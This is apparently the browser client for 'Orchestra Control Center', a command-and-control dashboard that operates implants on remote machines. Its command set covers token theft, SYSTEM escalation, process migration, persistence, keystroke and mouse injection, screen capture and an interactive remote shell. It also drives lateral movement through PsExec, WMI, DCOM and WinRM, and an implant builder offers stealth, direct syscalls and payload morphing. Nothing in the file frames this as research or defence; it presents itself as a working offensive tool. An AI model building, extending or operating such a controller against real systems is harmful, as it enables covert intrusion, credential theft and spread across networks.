// Orchestra Control Center — minimal dashboard client.
// Stores the bearer token in sessionStorage (cleared when the tab closes).

(() => {
  const $ = (id) => document.getElementById(id);
  let token = sessionStorage.getItem("oc_token") || "";
  let ws = null;

  const headers = () => ({
    "Authorization": "Bearer " + token,
    "Content-Type": "application/json",
  });

  async function api(path, opts = {}) {
    const res = await fetch("/api" + path, {
      ...opts,
      headers: { ...headers(), ...(opts.headers || {}) },
    });
    if (res.status === 401) throw new Error("unauthorized");
    return res;
  }

  // ── Login ─────────────────────────────────────────────────────────
  async function login() {
    const t = $("token").value.trim();
    if (!t) return;
    token = t;
    try {
      const res = await fetch("/api/agents", { headers: { "Authorization": "Bearer " + t } });
      if (res.status === 401) {
        $("login-err").textContent = "Invalid token.";
        return;
      }
      sessionStorage.setItem("oc_token", t);
      $("login").hidden = true;
      $("main-content").hidden = false;
      await refreshAgents();
      openWs();
    } catch (e) {
      $("login-err").textContent = "Connection failed: " + e.message;
    }
  }

  function fmtTime(epoch) {
    if (!epoch) return "—";
    const ago = Math.max(0, Math.floor(Date.now() / 1000) - epoch);
    if (ago < 60) return ago + "s ago";
    if (ago < 3600) return Math.floor(ago / 60) + "m ago";
    return new Date(epoch * 1000).toISOString();
  }

  // ── Agent table ───────────────────────────────────────────────────
  function renderAgents(agents) {
    $("agent-count").textContent = "(" + agents.length + ")";
    const tbody = $("agents-tbody");
    const sel = $("agent-select");
    const prevSel = sel.value;
    if (!agents.length) {
      tbody.innerHTML = '<tr><td colspan="4" class="muted">No agents connected.</td></tr>';
      sel.innerHTML = "";
      return;
    }
    tbody.innerHTML = agents.map(a =>
      `<tr><td><code>${escapeHtml(a.agent_id)}</code></td>` +
      `<td>${escapeHtml(a.hostname)}</td>` +
      `<td>${escapeHtml(a.peer)}</td>` +
      `<td>${fmtTime(a.last_seen)}</td></tr>`
    ).join("");
    sel.innerHTML = agents.map(a => `<option value="${escapeAttr(a.agent_id)}">${escapeHtml(a.agent_id)}</option>`).join("");
    if (agents.find(a => a.agent_id === prevSel)) sel.value = prevSel;
    // Keep the shell tab agent selector in sync.
    const shellSel = document.getElementById("shell-agent-select");
    if (shellSel) {
      const prevShell = shellSel.value;
      shellSel.innerHTML = sel.innerHTML;
      if (agents.find(a => a.agent_id === prevShell)) shellSel.value = prevShell;
    }
  }

  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;"}[c]));
  }
  function escapeAttr(s) { return escapeHtml(s); }

  async function refreshAgents() {
    try {
      const res = await api("/agents");
      const agents = await res.json();
      renderAgents(agents);
    } catch (e) {
      console.warn(e);
    }
  }

  // ── WebSocket ─────────────────────────────────────────────────────
  function openWs() {
    const proto = location.protocol === "https:" ? "wss:" : "ws:";
    // Browsers don't allow custom headers on WebSocket, so we pass the token
    // via the Sec-WebSocket-Protocol handshake header. The server's ws_handler
    // (orchestra-server/src/api.rs) extracts the value beginning with
    // "bearer." and validates it in constant time before completing the
    // upgrade; an unknown or missing token causes a 401 response.
    try {
      ws = new WebSocket(proto + "//" + location.host + "/api/ws", ["bearer." + token]);
      ws.onmessage = (ev) => {
        try {
          const m = JSON.parse(ev.data);
          if (m.kind === "agents") renderAgents(m.agents);
          if (m.kind === "audit") appendAudit(m.event);
        } catch {}
      };
      ws.onclose = () => setTimeout(openWs, 5000);
    } catch (e) {
      console.warn("ws open failed", e);
    }
    setInterval(refreshAgents, 5000);
  }

  function appendAudit(ev) {
    const line = `[${new Date(ev.timestamp * 1000).toISOString()}] ${ev.user} ${ev.action} -> ${ev.agent_id} (${ev.outcome === "Success" ? "ok" : "fail"}) ${ev.details}`;
    const el = $("audit");
    el.textContent = (line + "\n" + el.textContent).split("\n").slice(0, 200).join("\n");
  }

  // ── Modal dialog system ───────────────────────────────────────────
  let modalResolve = null;

  /**
   * Show a modal dialog with dynamically generated input fields.
   * @param {string} title - Modal title
   * @param {Array<{id:string,label:string,type?:string,placeholder?:string,value?:string}>} fields
   * @returns {Promise<Object|null>} - Resolves with {fieldId: value, ...} or null if cancelled
   */
  function showModal(title, fields) {
    return new Promise((resolve) => {
      modalResolve = resolve;
      $("modal-title").textContent = title;
      let html = "";
      for (const f of fields) {
        html += `<div class="modal-field">`;
        html += `<label>${escapeHtml(f.label)}</label>`;
        if (f.type === "textarea") {
          html += `<textarea id="modal-${f.id}" placeholder="${escapeAttr(f.placeholder || "")}" rows="4">${escapeHtml(f.value || "")}</textarea>`;
        } else {
          html += `<input id="modal-${f.id}" type="${f.type || "text"}" placeholder="${escapeAttr(f.placeholder || "")}" value="${escapeAttr(f.value || "")}">`;
        }
        html += `</div>`;
      }
      $("modal-body").innerHTML = html;
      $("modal-overlay").hidden = false;
      // Focus the first input
      const first = $("modal-body").querySelector("input, textarea");
      if (first) first.focus();
    });
  }

  function closeModal(result) {
    $("modal-overlay").hidden = true;
    if (modalResolve) {
      modalResolve(result);
      modalResolve = null;
    }
  }

  $("modal-confirm").addEventListener("click", () => {
    const inputs = $("modal-body").querySelectorAll("input, textarea");
    const result = {};
    inputs.forEach((el) => {
      const key = el.id.replace("modal-", "");
      result[key] = el.value;
    });
    closeModal(result);
  });

  $("modal-cancel").addEventListener("click", () => closeModal(null));
  $("modal-overlay").addEventListener("keydown", (e) => {
    if (e.key === "Escape") closeModal(null);
    if (e.key === "Enter" && !e.shiftKey && e.target.tagName !== "TEXTAREA") {
      e.preventDefault();
      $("modal-confirm").click();
    }
  });

  // ── Screenshot viewer ─────────────────────────────────────────────
  $("screenshot-close").addEventListener("click", () => {
    $("screenshot-overlay").hidden = true;
    $("screenshot-img").hidden = true;
  });

  function showScreenshot(base64Png) {
    const img = $("screenshot-img");
    img.src = "data:image/png;base64," + base64Png;
    img.hidden = false;
    $("screenshot-overlay").hidden = false;
  }

  // ── Command dispatch ──────────────────────────────────────────────
  /**
   * Build a command payload matching the Rust Command enum variants.
   * Each command name maps exactly to a Command enum variant.
   */
  function buildCommandPayload(cmdName, args) {
    switch (cmdName) {
      // ── Zero-arg commands ──
      case "Ping": return "Ping";
      case "GetSystemInfo": return "GetSystemInfo";
      case "ListProcesses": return "ListProcesses";
      case "DiscoverNetwork": return "DiscoverNetwork";
      case "CaptureScreen": return "CaptureScreen";
      case "StartHciLogging": return "StartHciLogging";
      case "StopHciLogging": return "StopHciLogging";
      case "GetHciLogBuffer": return "GetHciLogBuffer";
      case "ReloadConfig": return "ReloadConfig";
      case "EnablePersistence": return "EnablePersistence";
      case "DisablePersistence": return "DisablePersistence";
      case "ListPlugins": return "ListPlugins";
      case "Shutdown": return "Shutdown";

      // ── Single-string-arg commands ──
      case "ListDirectory": return { ListDirectory: { path: args.path } };
      case "ReadFile": return { ReadFile: { path: args.path } };
      case "RunApprovedScript": return { RunApprovedScript: { script: args.script } };
      case "DeployModule": return { DeployModule: { module_id: args.module_id } };
      case "ExecutePlugin": return { ExecutePlugin: { plugin_id: args.plugin_id, args: args.plugin_args || "" } };
      case "UnloadPlugin": return { UnloadPlugin: { plugin_id: args.plugin_id } };
      case "GetPluginInfo": return { GetPluginInfo: { plugin_id: args.plugin_id } };
      case "JobStatus": return { JobStatus: { job_id: args.job_id } };

      // ── WriteFile: path + base64 content ──
      case "WriteFile": return { WriteFile: { path: args.path, content: Array.from(new TextEncoder().encode(args.content)) } };

      // ── DownloadModule: module_id + optional repo_url ──
      case "DownloadModule": {
        const payload = { module_id: args.module_id };
        if (args.repo_url) payload.repo_url = args.repo_url;
        else payload.repo_url = null;
        return { DownloadModule: payload };
      }

      // ── ExecutePluginBinary: plugin_id + base64 input ──
      case "ExecutePluginBinary":
        return { ExecutePluginBinary: { plugin_id: args.plugin_id, input_data: Array.from(new TextEncoder().encode(args.input_data || "")) } };

      // ── Numeric-arg commands ──
      case "SimulateKey": return { SimulateKey: { key: args.key } };
      case "SimulateMouse": return { SimulateMouse: { x: parseInt(args.x, 10) || 0, y: parseInt(args.y, 10) || 0 } };
      case "MigrateAgent": return { MigrateAgent: { target_pid: parseInt(args.target_pid, 10) || 0 } };
      case "SetReencodeSeed": return { SetReencodeSeed: { seed: parseInt(args.seed, 10) || 0 } };
      case "MorphNow": return { MorphNow: { seed: parseInt(args.seed, 10) || 0 } };

      // ── Token Manipulation ──
      case "MakeToken": return { MakeToken: { username: args.username, password: args.password, domain: args.domain || ".", logon_type: parseInt(args.logon_type, 10) || 2 } };
      case "StealToken": return { StealToken: { target_pid: parseInt(args.target_pid, 10) || 0 } };
      case "Rev2Self": return "Rev2Self";
      case "GetSystem": return "GetSystem";

      // ── Lateral Movement ──
      case "PsExec": return { PsExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
      case "WmiExec": return { WmiExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
      case "DcomExec": return { DcomExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };
      case "WinRmExec": return { WinRmExec: { target_host: args.target_host, command: args.command, username: args.username || null, password: args.password || null } };

      default: return "Ping";
    }
  }

  /**
   * Per-command modal field definitions.
   * Commands not listed here are zero-arg and skip the modal.
   */
  const CMD_FIELDS = {
    ListDirectory: [{ id: "path", label: "Directory Path", placeholder: "/home/user" }],
    ReadFile: [{ id: "path", label: "File Path", placeholder: "/etc/hostname" }],
    WriteFile: [
      { id: "path", label: "File Path", placeholder: "/tmp/note.txt" },
      { id: "content", label: "File Content", type: "textarea", placeholder: "File content to write..." },
    ],
    RunApprovedScript: [{ id: "script", label: "Script Name", placeholder: "collect-logs" }],
    DeployModule: [{ id: "module_id", label: "Module ID", placeholder: "scanner-v2" }],
    DownloadModule: [
      { id: "module_id", label: "Module ID", placeholder: "scanner-v2" },
      { id: "repo_url", label: "Repository URL (optional)", placeholder: "https://..." },
    ],
    ExecutePlugin: [
      { id: "plugin_id", label: "Plugin ID", placeholder: "hello_plugin" },
      { id: "plugin_args", label: "Arguments", placeholder: "--verbose" },
    ],
    ExecutePluginBinary: [
      { id: "plugin_id", label: "Plugin ID", placeholder: "hello_plugin" },
      { id: "input_data", label: "Input Data (text)", placeholder: "data to pass" },
    ],
    GetPluginInfo: [{ id: "plugin_id", label: "Plugin ID", placeholder: "hello_plugin" }],
    UnloadPlugin: [{ id: "plugin_id", label: "Plugin ID", placeholder: "hello_plugin" }],
    SimulateKey: [{ id: "key", label: "Key", placeholder: "A" }],
    SimulateMouse: [
      { id: "x", label: "X coordinate", placeholder: "100" },
      { id: "y", label: "Y coordinate", placeholder: "200" },
    ],
    MigrateAgent: [{ id: "target_pid", label: "Target PID", placeholder: "1234" }],
    SetReencodeSeed: [{ id: "seed", label: "Seed (u64)", placeholder: "123456789" }],
    MorphNow: [{ id: "seed", label: "Seed (u64)", placeholder: "987654321" }],
    JobStatus: [{ id: "job_id", label: "Job ID", placeholder: "uuid" }],

    // ── Token Manipulation ──
    MakeToken: [
      { id: "username", label: "Username", placeholder: "admin" },
      { id: "password", label: "Password", placeholder: "P@ssw0rd" },
      { id: "domain", label: "Domain", placeholder: "." },
      { id: "logon_type", label: "Logon Type (2=Interactive,3=Network,9=NewCreds)", placeholder: "2" },
    ],
    StealToken: [{ id: "target_pid", label: "Target PID", placeholder: "1234" }],

    // ── Lateral Movement ──
    PsExec: [
      { id: "target_host", label: "Target Host", placeholder: "10.0.0.1" },
      { id: "command", label: "Command", placeholder: "whoami" },
      { id: "username", label: "Username (optional)", placeholder: "admin" },
      { id: "password", label: "Password (optional)", placeholder: "P@ssw0rd" },
    ],
    WmiExec: [
      { id: "target_host", label: "Target Host", placeholder: "10.0.0.1" },
      { id: "command", label: "Command", placeholder: "whoami" },
      { id: "username", label: "Username (optional)", placeholder: "admin" },
      { id: "password", label: "Password (optional)", placeholder: "P@ssw0rd" },
    ],
    DcomExec: [
      { id: "target_host", label: "Target Host", placeholder: "10.0.0.1" },
      { id: "command", label: "Command", placeholder: "whoami" },
      { id: "username", label: "Username (optional)", placeholder: "admin" },
      { id: "password", label: "Password (optional)", placeholder: "P@ssw0rd" },
    ],
    WinRmExec: [
      { id: "target_host", label: "Target Host", placeholder: "10.0.0.1" },
      { id: "command", label: "Command", placeholder: "whoami" },
      { id: "username", label: "Username (optional)", placeholder: "admin" },
      { id: "password", label: "Password (optional)", placeholder: "P@ssw0rd" },
    ],
  };

  /** Commands that require zero arguments (no modal needed). */
  const ZERO_ARG_CMDS = new Set([
    "Ping", "GetSystemInfo", "ListProcesses", "DiscoverNetwork", "CaptureScreen",
    "StartHciLogging", "StopHciLogging", "GetHciLogBuffer", "ReloadConfig",
    "EnablePersistence", "DisablePersistence", "ListPlugins", "Shutdown",
    "Rev2Self", "GetSystem",
  ]);

  async function handleCommand(cmdName) {
    const agentId = $("agent-select").value;
    if (!agentId) { alert("No agent selected."); return; }

    // ── Shutdown requires explicit "yes" confirmation ──
    if (cmdName === "Shutdown") {
      const result = await showModal("Confirm Shutdown", [
        { id: "confirm", label: 'Type "yes" to confirm agent shutdown:', placeholder: "yes" },
      ]);
      if (!result || result.confirm.toLowerCase() !== "yes") return;
    }

    // ── Commands needing modal input ──
    let args = {};
    if (CMD_FIELDS[cmdName]) {
      const result = await showModal(cmdName, CMD_FIELDS[cmdName]);
      if (!result) return; // cancelled
      args = result;
    }

    const command = buildCommandPayload(cmdName, args);
    $("result").textContent = "Sending…";
    $("result").className = "muted";

    try {
      const res = await api("/agents/" + encodeURIComponent(agentId) + "/command", {
        method: "POST",
        body: JSON.stringify({ command }),
      });
      const body = await res.json();
      const cls = body.outcome === "ok" ? "ok" : "err";
      $("result").className = cls;

      // ── Screenshot rendering ──
      // If CaptureScreen returns base64 PNG data, render it inline
      if (cmdName === "CaptureScreen" && body.outcome === "ok" && body.output) {
        // output may be a raw base64 string or JSON containing base64
        let b64 = body.output.trim();
        // Try to parse as JSON first (might be {data: "..."})
        try {
          const parsed = JSON.parse(b64);
          if (parsed.data) b64 = parsed.data;
          else if (typeof parsed === "string") b64 = parsed;
        } catch (_) {
          // not JSON — treat as raw base64
        }
        $("result").textContent = "Screenshot captured. Displaying image...";
        showScreenshot(b64);
      } else {
        $("result").textContent = JSON.stringify(body, null, 2);
      }
    } catch (e) {
      $("result").className = "err";
      $("result").textContent = "Request failed: " + e.message;
    }
  }

  // ── Wire up all command buttons ───────────────────────────────────
  document.querySelectorAll(".cmd-btn").forEach((btn) => {
    btn.addEventListener("click", () => {
      const cmd = btn.getAttribute("data-cmd");
      if (cmd) handleCommand(cmd);
    });
  });

  // ── Tab switching ─────────────────────────────────────────────────
  const tabDash = $("tab-dash");
  const tabShell = $("tab-shell");
  const tabBuilder = $("tab-builder");
  const btnDash = $("tab-btn-dash");
  const btnShell = $("tab-btn-shell");
  const btnBuilder = $("tab-btn-builder");

  function activateTab(active, inactive1, inactive2, tabActive, tabInactive1, tabInactive2) {
    tabActive.hidden = false;
    tabInactive1.hidden = true;
    tabInactive2.hidden = true;
    active.className = "tab-btn active";
    inactive1.className = "tab-btn";
    inactive2.className = "tab-btn";
  }

  btnDash.addEventListener("click", () => activateTab(btnDash, btnShell, btnBuilder, tabDash, tabShell, tabBuilder));
  btnShell.addEventListener("click", () => {
    activateTab(btnShell, btnDash, btnBuilder, tabShell, tabDash, tabBuilder);
    syncShellAgentSelect();
  });
  btnBuilder.addEventListener("click", () => activateTab(btnBuilder, btnDash, btnShell, tabBuilder, tabDash, tabShell));

  function syncShellAgentSelect() {
    const src = $("agent-select");
    const dst = $("shell-agent-select");
    const prev = dst.value;
    dst.innerHTML = src.innerHTML;
    if (dst.querySelector(`option[value="${escapeAttr(prev)}"]`)) dst.value = prev;
  }

  // ── xterm.js shell session ────────────────────────────────────────
  let term = null;
  let shellAgentId = null;
  let shellSessionId = null;
  let shellPollTimer = null;

  function initTerm() {
    if (term) { term.dispose(); }
    term = new Terminal({
      theme: {
        background: "#0d1117",
        foreground: "#e6edf3",
        cursor: "#58a6ff",
        selectionBackground: "#264f78",
        black: "#0d1117", red: "#f85149", green: "#3fb950", yellow: "#d29922",
        blue: "#58a6ff", magenta: "#bc8cff", cyan: "#39c5cf", white: "#e6edf3",
        brightBlack: "#8b949e", brightRed: "#ff7b72", brightGreen: "#56d364",
        brightYellow: "#e3b341", brightBlue: "#79c0ff", brightMagenta: "#d2a8ff",
        brightCyan: "#56d4dd", brightWhite: "#f0f6fc",
      },
      fontFamily: '"Cascadia Code", "Fira Code", "SF Mono", Consolas, "Courier New", monospace',
      fontSize: 14,
      cursorBlink: true,
      scrollback: 2000,
    });
    const container = $("terminal-container");
    container.innerHTML = "";
    term.open(container);
    term.onData((data) => sendShellInput(data));
  }

  async function openShell() {
    syncShellAgentSelect();
    const agentId = $("shell-agent-select").value;
    if (!agentId) { alert("Select an agent first."); return; }

    $("btn-shell-open").disabled = true;
    $("shell-status").textContent = "Connecting…";
    $("shell-status").className = "muted";

    try {
      const res = await api("/agents/" + encodeURIComponent(agentId) + "/shell", {
        method: "POST",
        body: "{}",
      });
      if (!res.ok) {
        const txt = await res.text();
        throw new Error(txt || res.statusText);
      }
      const { session_id } = await res.json();
      shellAgentId = agentId;
      shellSessionId = session_id;

      initTerm();
      $("shell-status").textContent = "Connected";
      $("shell-status").className = "muted connected";
      $("btn-shell-close").disabled = false;
      $("btn-shell-open").disabled = false;

      // 250ms polling interval for shell output
      shellPollTimer = setInterval(pollShellOutput, 250);
    } catch (e) {
      $("shell-status").textContent = "Failed: " + e.message;
      $("shell-status").className = "err";
      $("btn-shell-open").disabled = false;
    }
  }

  async function sendShellInput(data) {
    if (!shellSessionId) return;
    const encoded = btoa(data.split("").map(c => String.fromCharCode(c.charCodeAt(0) & 0xff)).join(""));
    try {
      await api(
        "/agents/" + encodeURIComponent(shellAgentId) +
        "/shell/" + encodeURIComponent(shellSessionId) + "/input",
        { method: "POST", body: JSON.stringify({ data: encoded }) }
      );
    } catch (e) {
      console.warn("shell input error", e);
    }
  }

  async function pollShellOutput() {
    if (!shellSessionId) return;
    try {
      const res = await api(
        "/agents/" + encodeURIComponent(shellAgentId) +
        "/shell/" + encodeURIComponent(shellSessionId) + "/output"
      );
      if (!res.ok) return;
      const { data } = await res.json();
      if (data && term) {
        try {
          // data is base64-encoded bytes from the agent
          const decoded = atob(data);
          term.write(decoded);
        } catch (_) {}
      }
    } catch (e) {
      console.warn("shell output poll error", e);
    }
  }

  async function closeShell() {
    if (shellPollTimer) { clearInterval(shellPollTimer); shellPollTimer = null; }
    if (shellAgentId && shellSessionId) {
      try {
        await api("/agents/" + encodeURIComponent(shellAgentId) + "/command", {
          method: "POST",
          body: JSON.stringify({ command: { CloseShell: { session_id: shellSessionId } } }),
        });
      } catch (_) {}
    }
    shellAgentId = null;
    shellSessionId = null;
    if (term) { term.write("\r\n\x1b[31m[session closed]\x1b[0m\r\n"); }
    $("btn-shell-close").disabled = true;
    $("shell-status").textContent = "Not connected";
    $("shell-status").className = "muted";
  }

  $("btn-shell-open").addEventListener("click", openShell);
  $("btn-shell-close").addEventListener("click", closeShell);

  // ── Builder ───────────────────────────────────────────────────────
  $("btn-gen-key").addEventListener("click", () => {
    const bytes = new Uint8Array(32);
    crypto.getRandomValues(bytes);
    $("build-key").value = Array.from(bytes).map(b => b.toString(16).padStart(2, "0")).join("");
  });

  /**
   * Read current feature checkbox state.
   * Names MUST match the Rust BuildFeatures struct fields:
   *   persistence, direct_syscalls, remote_assist, stealth
   */
  function getFeatures() {
    return {
      persistence: $("feat-persistence").checked,
      direct_syscalls: $("feat-direct-syscalls").checked,
      remote_assist: $("feat-remote-assist").checked,
      stealth: $("feat-stealth").checked,
    };
  }

  /** Apply feature object to checkboxes (for profile import). */
  function setFeatures(f) {
    $("feat-persistence").checked = !!f.persistence;
    $("feat-direct-syscalls").checked = !!f.direct_syscalls;
    $("feat-remote-assist").checked = !!f.remote_assist;
    $("feat-stealth").checked = !!f.stealth;
  }

  async function submitBuild() {
    const os = $("build-os").value;
    const arch = $("build-arch").value;
    const host = $("build-host").value.trim();
    const port = parseInt($("build-port").value, 10);
    const pin = $("build-pin").value.trim();
    const key = $("build-key").value.trim();
    const outDir = $("build-output-dir").value.trim();

    if (!host || !port || !pin || !key) {
      alert("Please fill in all connection details and encryption key.");
      return;
    }

    const req = {
      os, arch,
      features: getFeatures(),
      host, port, pin, key,
      output_dir: outDir ? outDir : null,
    };

    $("build-download").hidden = true;
    $("btn-build").disabled = true;
    const logEl = $("build-log");
    logEl.textContent = "Starting build...\n";
    logEl.className = "";

    try {
      const res = await fetch("/api/build", {
        method: "POST",
        headers: headers(),
        body: JSON.stringify(req),
      });

      const resData = await res.json();

      if (!res.ok) {
        logEl.textContent += "Error: " + (resData.error || res.statusText);
        logEl.className = "err";
      } else {
        logEl.textContent += "Build complete.\nJob ID: " + resData.job_id + "\n";
        logEl.textContent += resData.log || "";
        window.checkBuildStatus(resData.job_id);
      }
    } catch (e) {
      logEl.textContent += "\nRequest failed: " + e.message;
      logEl.className = "err";
    } finally {
      $("btn-build").disabled = false;
    }
  }

  $("btn-build").addEventListener("click", submitBuild);

  if (token) {
    $("token").value = token;
    login();
  }

  // ── Profile Encryption / Decryption using WebCrypto AES-GCM ──────
  async function getCryptoKey(passphrase, salt) {
    const enc = new TextEncoder();
    const keyMaterial = await window.crypto.subtle.importKey(
      "raw", enc.encode(passphrase), { name: "PBKDF2" }, false, ["deriveBits", "deriveKey"]
    );
    return window.crypto.subtle.deriveKey(
      { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
      keyMaterial,
      { name: "AES-GCM", length: 256 },
      true, ["encrypt", "decrypt"]
    );
  }

  function uint8ArrayToBase64(bytes) {
    let binary = "";
    for (let i = 0; i < bytes.byteLength; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    return window.btoa(binary);
  }

  function base64ToUint8Array(base64) {
    const binaryStr = window.atob(base64);
    const bytes = new Uint8Array(binaryStr.length);
    for (let i = 0; i < binaryStr.length; i++) {
      bytes[i] = binaryStr.charCodeAt(i);
    }
    return bytes;
  }

  $("btn-export-profile").addEventListener("click", async () => {
    const passphrase = $("profile-passphrase").value;
    if (!passphrase) { alert("Please provide a passphrase to encrypt the profile."); return; }

    const profileData = {
      os: $("build-os").value,
      arch: $("build-arch").value,
      features: getFeatures(),
      host: $("build-host").value.trim(),
      port: parseInt($("build-port").value, 10) || 443,
      pin: $("build-pin").value.trim(),
      key: $("build-key").value.trim(),
      output_dir: $("build-output-dir").value.trim() || undefined,
    };

    try {
      const salt = window.crypto.getRandomValues(new Uint8Array(16));
      const iv = window.crypto.getRandomValues(new Uint8Array(12));
      const key = await getCryptoKey(passphrase, salt);
      const encodedData = new TextEncoder().encode(JSON.stringify(profileData));
      const ciphertext = await window.crypto.subtle.encrypt(
        { name: "AES-GCM", iv: iv }, key, encodedData
      );

      const payload = {
        salt: uint8ArrayToBase64(salt),
        iv: uint8ArrayToBase64(iv),
        ciphertext: uint8ArrayToBase64(new Uint8Array(ciphertext)),
      };

      const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "orchestra_profile.enc.json";
      a.click();
    } catch (e) {
      alert("Encryption failed: " + e.message);
    }
  });

  $("btn-import-profile").addEventListener("click", async () => {
    const fileFile = $("profile-file").files[0];
    if (!fileFile) { alert("Please select a profile file."); return; }

    const passphrase = $("profile-passphrase").value;

    try {
      const text = await fileFile.text();
      let data = JSON.parse(text);
      if (data.ciphertext) {
        if (!passphrase) { alert("This profile is encrypted. Provide a passphrase."); return; }
        const salt = base64ToUint8Array(data.salt);
        const iv = base64ToUint8Array(data.iv);
        const ciphertext = base64ToUint8Array(data.ciphertext);
        const cryptoKey = await getCryptoKey(passphrase, salt);

        const decrypted = await window.crypto.subtle.decrypt(
          { name: "AES-GCM", iv: iv }, cryptoKey, ciphertext
        );
        data = JSON.parse(new TextDecoder().decode(decrypted));
      }

      if (data.os) $("build-os").value = data.os;
      if (data.arch) $("build-arch").value = data.arch;
      // Accept both old (syscalls/screencap/keylog) and new (direct_syscalls/remote_assist) keys
      if (data.features) {
        if (data.features.direct_syscalls !== undefined) {
          setFeatures(data.features);
        } else if (data.features.syscalls !== undefined) {
          // Legacy profile: map old names to new struct fields
          setFeatures({
            persistence: data.features.persistence,
            direct_syscalls: data.features.syscalls || data.features.screencap,
            remote_assist: data.features.screencap || data.features.keylog,
            stealth: data.features.stealth,
          });
        }
      }
      if (data.host) $("build-host").value = data.host;
      if (data.port) $("build-port").value = data.port;
      if (data.pin) $("build-pin").value = data.pin;
      if (data.key) $("build-key").value = data.key;
      if (data.output_dir !== undefined) $("build-output-dir").value = data.output_dir;

      alert("Profile loaded successfully.");
    } catch (e) {
      alert("Decryption or loading failed: " + e.message);
    }
  });
})();

// ── Build status polling (must be outside IIFE to be callable from inline code) ──
window.checkBuildStatus = async function(job_id) {
  const logEl = document.getElementById("build-log");
  const tok = sessionStorage.getItem("oc_token") || "";
  try {
    const res = await fetch("/api/build/status/" + job_id, {
      headers: { "Authorization": "Bearer " + tok, "Content-Type": "application/json" },
    });
    if (!res.ok) {
      logEl.textContent += "\nError fetching status: " + res.statusText;
      document.getElementById("btn-build").disabled = false;
      return;
    }
    const data = await res.json();
    const currentLog = data.log || "";
    if (currentLog) {
      logEl.textContent = "Job ID: " + job_id + "\n" + currentLog;
    }

    if (data.status === "Queued" || data.status === "Running") {
      setTimeout(() => window.checkBuildStatus(job_id), 2000);
    } else {
      document.getElementById("btn-build").disabled = false;
      if (data.status === "Completed") {
        logEl.className = "ok";
        const dload = document.getElementById("build-download");
        dload.hidden = false;
        document.getElementById("build-download-link").href =
          "/api/build/" + job_id + "/download?token=" + encodeURIComponent(tok);
      } else {
        logEl.className = "err";
      }
    }
  } catch (e) {
    logEl.textContent += "\nStatus check failed: " + e.message;
    document.getElementById("btn-build").disabled = false;
  }
};

